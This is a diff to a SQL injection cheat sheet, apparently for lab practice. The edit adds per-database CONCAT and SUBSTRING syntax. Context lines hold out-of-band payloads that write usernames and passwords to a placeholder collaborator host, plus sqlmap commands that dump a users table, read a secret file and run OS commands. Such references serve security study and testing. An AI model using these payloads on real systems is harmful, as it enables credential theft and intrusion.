@@ -14,7 +14,7 @@
       - [TIME BASED](#time-based)
       - [BLIND BASED](#blind-based)
       - [OUT-OF-BAND](#out-of-band)
-      - [CONCAT STRINGS](#concat)
+      - [CONCAT STRINGS](#concat-and-substring)
       - [BYPASSING-SQL-SINTAX](#bypassing-sql-sintax)
       - [WAF-AUTH-BYPASS](#waf-auth-bypass)
       - [SQL MAP](#sql-map)
@@ -160,14 +160,20 @@ SELECT LOAD_FILE('\\\\<COLLAB_DOMAIN>\\<FILENAME>');
 SELECT username, password INTO OUTFILE '\\\\<COLLAB_DOMAIN>\\<FILENAME>';
 ```
 
-#### CONCAT
+#### CONCAT-AND-SUBSTRING
 
 ```sql
-'foo' || 'bar'      ->  Oracle     
-'foo' + 'bar'       -> Microsoft SQL Server   
-'foo' || 'bar'      -> PostgreSQL  
-'foo' 'bar'         ->  MySQL (espaces)  
-CONCAT('foo','bar') -> MySQL
+'foo' || 'bar'          -> Oracle  
+'foo' + 'bar'           -> Microsoft SQL Server  
+'foo' || 'bar'          -> PostgreSQL  
+'foo' 'bar'             -> MySQL (espacio)  
+CONCAT('foo','bar')     -> MySQL  
+
+SUBSTR('foobar', 4, 2)      -> Oracle  
+SUBSTRING('foobar', 4, 2)   -> Microsoft SQL Server  
+SUBSTRING('foobar', 4, 2)   -> PostgreSQL  
+SUBSTRING('foobar', 4, 2)   -> MySQL
+
 ```
 
 #### BYPASSING-SQL-SINTAX
@@ -314,4 +320,5 @@ sqlmap -r req.txt --level=5 --risk=3 --dump -D public -T users
 sqlmap -u "<IP>/?category=Pets" -p category --file-read "/home/carlos/secret" -v 1
 sqlmap -u "<IP>/?category=Pets" -p category --os-cmd "cat /home/carlos/secret" -v 1
 ```
+
 
